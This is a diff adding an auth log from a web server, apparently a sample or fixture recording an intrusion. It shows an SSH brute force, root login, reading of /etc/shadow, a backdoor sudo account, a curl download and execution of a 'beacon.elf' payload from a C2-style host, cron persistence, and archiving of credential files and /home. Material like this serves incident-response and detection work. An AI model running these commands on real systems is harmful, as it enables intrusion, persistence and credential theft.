@@ -1,0 +1,27 @@
+Mar 27 03:41:07 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2
+Mar 27 03:41:09 prod-web-01 sshd[4412]: Failed password for root from 185.220.101.34 port 44231 ssh2
+Mar 27 03:41:12 prod-web-01 sshd[4413]: Failed password for root from 185.220.101.34 port 44232 ssh2
+Mar 27 03:41:15 prod-web-01 sshd[4414]: Failed password for root from 185.220.101.34 port 44233 ssh2
+Mar 27 03:41:18 prod-web-01 sshd[4415]: Failed password for root from 185.220.101.34 port 44234 ssh2
+Mar 27 03:42:33 prod-web-01 sshd[4420]: Failed password for admin from 185.220.101.34 port 44240 ssh2
+Mar 27 03:42:36 prod-web-01 sshd[4421]: Failed password for admin from 185.220.101.34 port 44241 ssh2
+Mar 27 03:43:01 prod-web-01 sshd[4425]: Failed password for deploy from 185.220.101.34 port 44245 ssh2
+Mar 27 03:44:19 prod-web-01 sshd[4430]: Failed password for invalid user www-data from 185.220.101.34 port 44250 ssh2
+Mar 27 03:47:12 prod-web-01 sshd[4435]: Accepted password for root from 185.220.101.34 port 44260 ssh2
+Mar 27 03:47:34 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 27 03:48:02 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash svc-backup
+Mar 27 03:48:15 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Mar 27 03:49:01 prod-web-01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /root/.ssh/authorized_keys /home/svc-backup/.ssh/authorized_keys
+Mar 27 03:52:44 prod-web-01 sshd[4500]: Accepted publickey for svc-backup from 45.153.160.140 port 55100 ssh2
+Mar 27 04:01:18 prod-web-01 sshd[4550]: Accepted publickey for svc-backup from 185.220.101.34 port 55200 ssh2
+Mar 27 04:13:08 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x https://paste.c2-infra.xyz/dl/beacon.elf
+Mar 27 04:13:29 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x
+Mar 27 04:13:33 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.x
+Mar 27 04:15:01 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l
+Mar 27 04:15:18 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c echo '*/5 * * * * /tmp/.x' >> /var/spool/cron/crontabs/root
+Mar 27 14:00:22 prod-web-01 sshd[5100]: Accepted publickey for deploy from 10.0.5.22 port 60100 ssh2
+Mar 27 14:00:31 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.bak.tar.gz /etc/passwd /etc/shadow /home
+Mar 27 14:02:18 prod-web-01 sudo: svc-backup : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/base64 /tmp/.bak.tar.gz
+Mar 28 02:10:05 prod-web-01 sshd[6001]: Failed password for invalid user scanner from 171.25.193.78 port 33100 ssh2
+Mar 28 02:10:08 prod-web-01 sshd[6002]: Failed password for invalid user scanner from 171.25.193.78 port 33101 ssh2
+Mar 28 02:10:11 prod-web-01 sshd[6003]: Failed password for invalid user admin from 171.25.193.78 port 33102 ssh2
